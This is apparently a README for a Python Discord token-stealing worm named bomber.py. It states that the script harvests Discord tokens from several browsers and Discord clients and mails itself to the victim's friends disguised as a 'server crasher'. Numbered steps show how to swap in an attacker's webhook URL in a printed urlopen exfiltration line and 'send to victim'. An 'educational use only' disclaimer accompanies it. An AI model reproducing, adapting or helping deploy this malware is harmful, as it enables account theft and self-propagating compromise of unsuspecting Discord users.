To run this you need to have python installed on your computer.

To download it go to: https://www.python.org/downloads/ and get the latest stable version.

DO NOT RUN THIS ON YOUR COMPUTER if you want to see what it does i recomend you run it in a vm and not a computer that you have logged your main discord account in previously.

This python script when you run it will token log the person and then send the file (bomber.py) to everyone on there friends list saying its a discord server crasher.

## It token logs from

Chrome

Discord

Discord PTB

Discord Canary

Opera

Brave

Yandex

## instuctions

If you want to change were it sends the token to.

1. create a discord server 

 ![Screenshot 2021-05-09 150939](https://user-images.githubusercontent.com/83868916/117561272-a3a73180-b0d8-11eb-8ff1-bd4e4e4584e8.png)

2. add a webhook ![Screenshot 2021-05-09 150105](https://user-images.githubusercontent.com/83868916/117561184-d270d800-b0d7-11eb-9432-49ec9ff63840.png)

3. copy webhook url ![Screenshot 2021-05-09 150143](https://user-images.githubusercontent.com/83868916/117561189-d69cf580-b0d7-11eb-8473-9b7f8d902403.png)

4. open the bommer.py in IDLE or another python editor ![Screenshot 2021-05-09 150211](https://user-images.githubusercontent.com/83868916/117561191-d7ce2280-b0d7-11eb-9978-ee33c259c576.png)

5. scroll down to the last line before the blank (big gap in code) near the bottom 
 were it says 
try:
        urlopen(Request("https://discord.com/api/webhooks/840487083444535366/0WIjgINkadXvuOMXOdwNahKFVROWtq-_ktGhPLLdZSy4b0QZo-2rljJWCabkaC9I-oQJ", data=dumps(webhook).encode(), headers=getheaders())) ![Screenshot 2021-05-09 150239](https://user-images.githubusercontent.com/83868916/117561194-d997e600-b0d7-11eb-8225-0bb6d77fa324.png)
6. change the "https://discord.com/api/webhooks/840487083444535366/0WIjgINkadXvuOMXOdwNahKFVROWtq-_ktGhPLLdZSy4b0QZo-2rljJWCabkaC9I-oQJ" to your webhook url ![Screenshot 2021-05-09 150300](https://user-images.githubusercontent.com/83868916/117561195-dac91300-b0d7-11eb-9494-a55d8f6e5276.png)

7. save the file ![Screenshot 2021-05-09 151713](https://user-images.githubusercontent.com/83868916/117561385-b2421880-b0d9-11eb-98c4-00c3641d6ba6.png)

8. send to victim on discord ![Screenshot 2021-05-09 145846](https://user-images.githubusercontent.com/83868916/117561181-d00e7e00-b0d7-11eb-9921-46f8689a5e19.png)

# **!!Disclaimer this is for educational use only and i am not responsible for your actions or uses of this code!!**
